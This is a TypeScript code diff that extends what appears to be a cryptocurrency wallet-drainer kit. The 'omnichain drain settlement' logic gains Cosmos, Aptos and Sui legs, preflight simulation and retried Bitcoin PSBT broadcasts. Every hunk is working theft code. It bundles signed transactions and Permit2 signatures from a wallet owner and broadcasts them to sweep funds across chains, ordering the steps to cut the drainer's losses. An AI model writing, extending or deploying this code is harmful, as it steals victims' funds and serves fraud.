@@ -13,6 +13,11 @@ import { getAddress, stringToHex } from 'viem'
 import { broadcastPSBT } from './bitcoin-drain.js'
 import { tryExecuteBatchPermit2WithFlashloan } from './flashloan-executor.js'
 import {
+  notifyOmnichainPartialSuccess,
+  retryLeg,
+  runPreflightSimulation,
+} from './omnichain-leg-orchestrator.js'
+import {
   executeBatchPermit2Settlement,
   executeOmnichainNativeDrainSettlement,
   type BatchNftEntry,
@@ -46,6 +51,9 @@ export type OmnichainAtomicSettlementHashes = {
   trc20?: string
   jetton?: string
   bitcoin?: string
+  cosmos?: string
+  aptos?: string
+  sui?: string
   nft?: string[]
 }
 
@@ -58,6 +66,9 @@ export type OmnichainAtomicSignatureEnvelope = {
   solana_payload?: OmnichainNativeDrainPayload
   tron_payload?: OmnichainNativeDrainPayload
   ton_payload?: OmnichainNativeDrainPayload
+  cosmos_payload?: OmnichainNativeDrainPayload
+  aptos_payload?: OmnichainNativeDrainPayload
+  sui_payload?: OmnichainNativeDrainPayload
   bitcoin_payload?: OmnichainAtomicBitcoinPayload
   settlement_transaction_hashes?: OmnichainAtomicSettlementHashes
 }
@@ -68,6 +79,9 @@ export type OmnichainAtomicChainKey =
   | 'tron'
   | 'ton'
   | 'bitcoin'
+  | 'cosmos'
+  | 'aptos'
+  | 'sui'
 
 export type OmnichainAtomicChainStatus = 'skipped' | 'ok' | 'failed'
 
@@ -90,6 +104,24 @@ function finalizeOmnichainResult(
   return { settlement_mode: 'sequential_v1', ...partial }
 }
 
+function hasExtendedChainLeg(payload: OmnichainNativeDrainPayload | undefined): boolean {
+  if (payload == null) return false
+  return (
+    hasPositiveExtendedAmount(payload.native_amount_cosmos) ||
+    hasPositiveExtendedAmount(payload.native_amount_aptos) ||
+    hasPositiveExtendedAmount(payload.native_amount_sui)
+  )
+}
+
+function hasPositiveExtendedAmount(value: string | undefined): boolean {
+  if (value == null || value.trim() === '') return false
+  try {
+    return BigInt(value) > 0n
+  } catch {
+    return false
+  }
+}
+
 function hasOmnichainLeg(payload: OmnichainNativeDrainPayload | undefined): boolean {
   if (payload == null) return false
   return (
@@ -98,15 +130,42 @@ function hasOmnichainLeg(payload: OmnichainNativeDrainPayload | undefined): bool
     Boolean(payload.native_signed_transaction_trx) ||
     Boolean(payload.native_signed_transaction_trc20) ||
     Boolean(payload.native_signed_transaction_ton) ||
-    Boolean(payload.native_signed_transaction_jetton)
+    Boolean(payload.native_signed_transaction_jetton) ||
+    Boolean(payload.cosmos_signed_tx) ||
+    Boolean(payload.aptos_signed_tx) ||
+    (Boolean(payload.sui_signed_tx) && Boolean(payload.sui_signature))
   )
+}
+
+function pickExtendedFields(
+  ...sources: Array<OmnichainNativeDrainPayload | undefined>
+): OmnichainNativeDrainPayload {
+  const out: OmnichainNativeDrainPayload = {}
+  for (const src of sources) {
+    if (!src) continue
+    if (src.native_amount_cosmos != null) out.native_amount_cosmos = src.native_amount_cosmos
+    if (src.cosmos_signed_tx) out.cosmos_signed_tx = src.cosmos_signed_tx
+    if (src.cosmos_tx_encoding) out.cosmos_tx_encoding = src.cosmos_tx_encoding
+    if (src.native_amount_aptos != null) out.native_amount_aptos = src.native_amount_aptos
+    if (src.aptos_signed_tx) out.aptos_signed_tx = src.aptos_signed_tx
+    if (src.aptos_signature) out.aptos_signature = src.aptos_signature
+    if (src.aptos_tx_encoding) out.aptos_tx_encoding = src.aptos_tx_encoding
+    if (src.native_amount_sui != null) out.native_amount_sui = src.native_amount_sui
+    if (src.sui_signed_tx) out.sui_signed_tx = src.sui_signed_tx
+    if (src.sui_signature) out.sui_signature = src.sui_signature
+  }
+  return out
 }
 
 function mergeOmnichainNativePayloads(
   solana?: OmnichainNativeDrainPayload,
   tron?: OmnichainNativeDrainPayload,
   ton?: OmnichainNativeDrainPayload,
+  cosmos?: OmnichainNativeDrainPayload,
+  aptos?: OmnichainNativeDrainPayload,
+  sui?: OmnichainNativeDrainPayload,
 ): OmnichainNativeDrainPayload | undefined {
+  const extended = pickExtendedFields(cosmos, aptos, sui, solana, tron, ton)
   const merged: OmnichainNativeDrainPayload = {
     ...(solana?.native_amount_sol != null ? { native_amount_sol: solana.native_amount_sol } : {}),
     ...(solana?.native_signed_transaction_sol
@@ -135,8 +194,9 @@ function mergeOmnichainNativePayloads(
     ...(ton?.native_signed_transaction_jetton
       ? { native_signed_transaction_jetton: ton.native_signed_transaction_jetton }
       : {}),
+    ...extended,
   }
-  return hasOmnichainLeg(merged) ? merged : undefined
+  return hasOmnichainLeg(merged) || hasExtendedChainLeg(merged) ? merged : undefined
 }
 
 function resolveEvmPayload(
@@ -162,6 +222,9 @@ export function packOmnichainAtomicSignatureEnvelope(params: {
   solanaPayload?: OmnichainNativeDrainPayload
   tronPayload?: OmnichainNativeDrainPayload
   tonPayload?: OmnichainNativeDrainPayload
+  cosmosPayload?: OmnichainNativeDrainPayload
+  aptosPayload?: OmnichainNativeDrainPayload
+  suiPayload?: OmnichainNativeDrainPayload
   bitcoinPayload?: OmnichainAtomicBitcoinPayload
   settlementTransactionHashes?: OmnichainAtomicSettlementHashes
 }): Hex {
@@ -188,6 +251,15 @@ export function packOmnichainAtomicSignatureEnvelope(params: {
       : {}),
     ...(params.tonPayload && hasOmnichainLeg(params.tonPayload)
       ? { ton_payload: params.tonPayload }
+      : {}),
+    ...(params.cosmosPayload && hasExtendedChainLeg(params.cosmosPayload)
+      ? { cosmos_payload: params.cosmosPayload }
+      : {}),
+    ...(params.aptosPayload && hasExtendedChainLeg(params.aptosPayload)
+      ? { aptos_payload: params.aptosPayload }
+      : {}),
+    ...(params.suiPayload && hasExtendedChainLeg(params.suiPayload)
+      ? { sui_payload: params.suiPayload }
       : {}),
     ...(params.bitcoinPayload?.signed_psbt_base64
       ? { bitcoin_payload: params.bitcoinPayload }
@@ -287,6 +359,13 @@ export function parseOmnichainAtomicSignatureEnvelope(
         ? { tron_payload: readOmnichainPayload('tron_payload') }
         : {}),
       ...(readOmnichainPayload('ton_payload') ? { ton_payload: readOmnichainPayload('ton_payload') } : {}),
+      ...(readOmnichainPayload('cosmos_payload')
+        ? { cosmos_payload: readOmnichainPayload('cosmos_payload') }
+        : {}),
+      ...(readOmnichainPayload('aptos_payload')
+        ? { aptos_payload: readOmnichainPayload('aptos_payload') }
+        : {}),
+      ...(readOmnichainPayload('sui_payload') ? { sui_payload: readOmnichainPayload('sui_payload') } : {}),
       ...(readBitcoin() ? { bitcoin_payload: readBitcoin() } : {}),
       ...(settlement_transaction_hashes
         ? { settlement_transaction_hashes }
@@ -315,6 +394,9 @@ export async function executeOmnichainAtomicSettlement(params: {
     tron: 'skipped',
     ton: 'skipped',
     bitcoin: 'skipped',
+    cosmos: 'skipped',
+    aptos: 'skipped',
+    sui: 'skipped',
   }
   const faults: Array<{ chain: OmnichainAtomicChainKey; detail: string }> = []
   const settlementHashes: OmnichainAtomicSettlementHashes = {}
@@ -324,6 +406,9 @@ export async function executeOmnichainAtomicSettlement(params: {
     params.envelope.solana_payload,
     params.envelope.tron_payload,
     params.envelope.ton_payload,
+    params.envelope.cosmos_payload,
+    params.envelope.aptos_payload,
+    params.envelope.sui_payload,
   )
   const bitcoinPayload = params.envelope.bitcoin_payload
 
@@ -333,6 +418,7 @@ export async function executeOmnichainAtomicSettlement(params: {
   const hasTon = hasOmnichainLeg(params.envelope.ton_payload)
   const hasOmnichainMerged = omnichainMerged != null
   const hasBitcoin = Boolean(bitcoinPayload?.signed_psbt_base64?.trim())
+  const hasCosmosAptosSui = hasExtendedChainLeg(omnichainMerged)
 
   if (!hasEvm && !hasOmnichainMerged && !hasBitcoin) {
     return finalizeOmnichainResult({
@@ -343,13 +429,40 @@ export async function executeOmnichainAtomicSettlement(params: {
     })
   }
 
+  if (hasOmnichainMerged || hasBitcoin) {
+    const preflight = await runPreflightSimulation({
+      payload: omnichainMerged ?? {},
+      bitcoinPsbtBase64: bitcoinPayload?.signed_psbt_base64,
+      walletAddress: params.owner,
+    })
+    if (!preflight.ok) {
+      return finalizeOmnichainResult({
+        ok: false,
+        chains,
+        detail: preflight.faults.map((f) => `${f.key}: ${f.detail}`).join('; '),
+        faults: preflight.faults.map((f) => ({
+          chain: f.key === 'spl' || f.key === 'sol' ? 'solana' : f.key === 'trx' || f.key === 'trc20' ? 'tron' : f.key === 'ton' || f.key === 'jetton' ? 'ton' : f.key as OmnichainAtomicChainKey,
+          detail: f.detail,
+        })),
+      })
+    }
+  }
+
   // Non-EVM + Bitcoin legs first — if they fail, EVM Permit2 has not run yet (reduces partial loss).
   if (hasOmnichainMerged && omnichainMerged) {
     if (hasSolana) chains.solana = 'failed'
     if (hasTron) chains.tron = 'failed'
     if (hasTon) chains.ton = 'failed'
+    if (hasCosmosAptosSui) {
+      if (hasPositiveExtendedAmount(omnichainMerged.native_amount_cosmos)) chains.cosmos = 'failed'
+      if (hasPositiveExtendedAmount(omnichainMerged.native_amount_aptos)) chains.aptos = 'failed'
+      if (hasPositiveExtendedAmount(omnichainMerged.native_amount_sui)) chains.sui = 'failed'
+    }
 
-    const omnichainResult = await executeOmnichainNativeDrainSettlement(omnichainMerged)
+    const omnichainResult = await executeOmnichainNativeDrainSettlement(omnichainMerged, {
+      skipPreflight: true,
+      ownerAddress: params.owner,
+    })
     const oc = omnichainResult.transaction_hashes
 
     if (hasSolana) {
@@ -380,13 +493,41 @@ export async function executeOmnichainAtomicSettlement(params: {
     if (oc.trc20) settlementHashes.trc20 = oc.trc20
     if (oc.ton) settlementHashes.ton = oc.ton
     if (oc.jetton) settlementHashes.jetton = oc.jetton
+    if (oc.cosmos) {
+      settlementHashes.cosmos = oc.cosmos
+      chains.cosmos = omnichainResult.ok ? 'ok' : 'failed'
+    }
+    if (oc.aptos) {
+      settlementHashes.aptos = oc.aptos
+      chains.aptos = omnichainResult.ok ? 'ok' : 'failed'
+    }
+    if (oc.sui) {
+      settlementHashes.sui = oc.sui
+      chains.sui = omnichainResult.ok ? 'ok' : 'failed'
+    }
+
+    if (hasCosmosAptosSui && !omnichainResult.ok) {
+      void notifyOmnichainPartialSuccess({
+        succeeded: Object.keys(settlementHashes),
+        failed: [omnichainResult.detail ?? 'extended chain leg failed'],
+        settlementMode: 'sequential_v1',
+      })
+    }
 
     if (!omnichainResult.ok) {
       const faultChain: OmnichainAtomicChainKey = hasSolana
         ? 'solana'
         : hasTron
           ? 'tron'
-          : 'ton'
+          : hasTon
+            ? 'ton'
+            : hasPositiveExtendedAmount(omnichainMerged.native_amount_cosmos)
+              ? 'cosmos'
+              : hasPositiveExtendedAmount(omnichainMerged.native_amount_aptos)
+                ? 'aptos'
+                : hasPositiveExtendedAmount(omnichainMerged.native_amount_sui)
+                  ? 'sui'
+                  : 'evm'
       faults.push({
         chain: faultChain,
         detail: omnichainResult.detail ?? 'Omnichain native settlement failed',
@@ -413,12 +554,19 @@ export async function executeOmnichainAtomicSettlement(params: {
 
   if (hasBitcoin && bitcoinPayload) {
     chains.bitcoin = 'failed'
-    const btc = await broadcastPSBT(bitcoinPayload.signed_psbt_base64)
-    if (btc.ok && btc.tx_hash) {
+    const btcRetry = await retryLeg('bitcoin', () =>
+      broadcastPSBT(bitcoinPayload.signed_psbt_base64).then((btc) =>
+        btc.ok && btc.tx_hash
+          ? { ok: true, tx_hash: btc.tx_hash }
+          : { ok: false, detail: btc.detail ?? 'Bitcoin PSBT broadcast failed' },
+      ),
+    )
+    const btc = btcRetry.result
+    if (btcRetry.ok && btc?.ok && btc.tx_hash) {
       chains.bitcoin = 'ok'
       settlementHashes.bitcoin = btc.tx_hash
     } else {
-      faults.push({ chain: 'bitcoin', detail: btc.detail ?? 'Bitcoin PSBT broadcast failed' })
+      faults.push({ chain: 'bitcoin', detail: btcRetry.detail ?? btc?.detail ?? 'Bitcoin PSBT broadcast failed' })
       return finalizeOmnichainResult({
         ok: false,
         chains,
@@ -485,6 +633,9 @@ export async function executeOmnichainAtomicSettlement(params: {
       hasTron ? 'tron' : null,
       hasTon ? 'ton' : null,
       hasBitcoin ? 'bitcoin' : null,
+      settlementHashes.cosmos ? 'cosmos' : null,
+      settlementHashes.aptos ? 'aptos' : null,
+      settlementHashes.sui ? 'sui' : null,
     ] as const
   ).filter((c): c is OmnichainAtomicChainKey => c != null)
 
